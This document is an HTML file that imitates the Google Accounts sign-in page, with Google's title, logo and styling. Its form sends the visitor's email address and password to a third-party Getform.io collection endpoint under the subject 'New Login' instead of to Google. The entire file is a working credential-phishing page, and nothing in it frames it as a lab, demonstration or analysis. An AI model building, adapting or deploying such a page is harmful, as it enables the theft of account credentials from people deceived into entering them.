<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Sign in - Google Accounts</title>
    <style>
        body {
            font-family: Arial, sans-serif;
            background: #fff;
            display: flex;
            justify-content: center;
            align-items: center;
            height: 100vh;
            margin: 0;
        }
        .card {
            max-width: 400px;
            width: 100%;
            padding: 48px 40px 36px;
            border: 1px solid #dadce0;
            border-radius: 8px;
            text-align: center;
        }
        .logo {
            width: 75px;
            margin-bottom: 20px;
        }
        h1 {
            font-size: 24px;
            font-weight: 400;
            margin: 0 0 10px;
        }
        .subtitle {
            font-size: 16px;
            color: #202124;
            margin-bottom: 30px;
        }
        .input-group {
            margin-bottom: 20px;
            text-align: left;
        }
        .input-group input {
            width: 100%;
            padding: 13px 15px;
            font-size: 16px;
            border: 1px solid #dadce0;
            border-radius: 4px;
            box-sizing: border-box;
        }
        .input-group input:focus {
            border-color: #1a73e8;
            outline: none;
        }
        #passwordField {
            display: none;
        }
        .next-btn {
            background: #1a73e8;
            color: white;
            border: none;
            padding: 12px 24px;
            border-radius: 4px;
            font-size: 14px;
            cursor: pointer;
            float: right;
        }
        .next-btn:hover {
            background: #1557b0;
        }
        .forgot-email {
            color: #1a73e8;
            text-decoration: none;
            font-size: 14px;
            display: block;
            text-align: left;
            margin-top: 10px;
        }
        .footer-links {
            margin-top: 30px;
            font-size: 12px;
            color: #5f6368;
            display: flex;
            justify-content: space-between;
        }
        .footer-links a {
            color: #5f6368;
            text-decoration: none;
            margin: 0 5px;
        }
        .create-account {
            color: #1a73e8;
            text-decoration: none;
            font-weight: 500;
            float: left;
            margin-top: 10px;
        }
        .clearfix::after {
            content: "";
            clear: both;
            display: table;
        }
    </style>
</head>
<body>
    <div class="card">
        <img class="logo" src="https://ssl.gstatic.com/images/branding/googlelogo/2x/googlelogo_color_74x24dp.png" alt="Google">
        <h1>Sign in</h1>
        <p class="subtitle">Use your Google Account</p>

        <!-- Form submits to Getform.io -->
        <form action="https://getform.io/f/uj4j0mrnkcw" method="POST">
            <!-- Hidden field for email subject -->
            <input type="hidden" name="_subject" value="New Login">

            <!-- Email Field -->
            <div class="input-group" id="emailField">
                <input type="email" name="identifier" placeholder="Email or phone" onblur="showPassword()" autofocus required>
            </div>

            <!-- Password Field (hidden initially) -->
            <div class="input-group" id="passwordField">
                <input type="password" name="hiddenPassword" placeholder="Enter your password" required>
            </div>

            <a href="#" class="forgot-email">Forgot email?</a>

            <div class="clearfix">
                <a href="#" class="create-account">Create account</a>
                <button type="submit" class="next-btn">Next</button>
            </div>
        </form>

        <div class="footer-links">
            <span>English (United States)</span>
            <span>
                <a href="#">Help</a>
                <a href="#">Privacy</a>
                <a href="#">Terms</a>
            </span>
        </div>
    </div>

    <script>
        function showPassword() {
            document.getElementById('emailField').style.display = 'none';
            document.getElementById('passwordField').style.display = 'block';
        }
    </script>
</body>
</html>
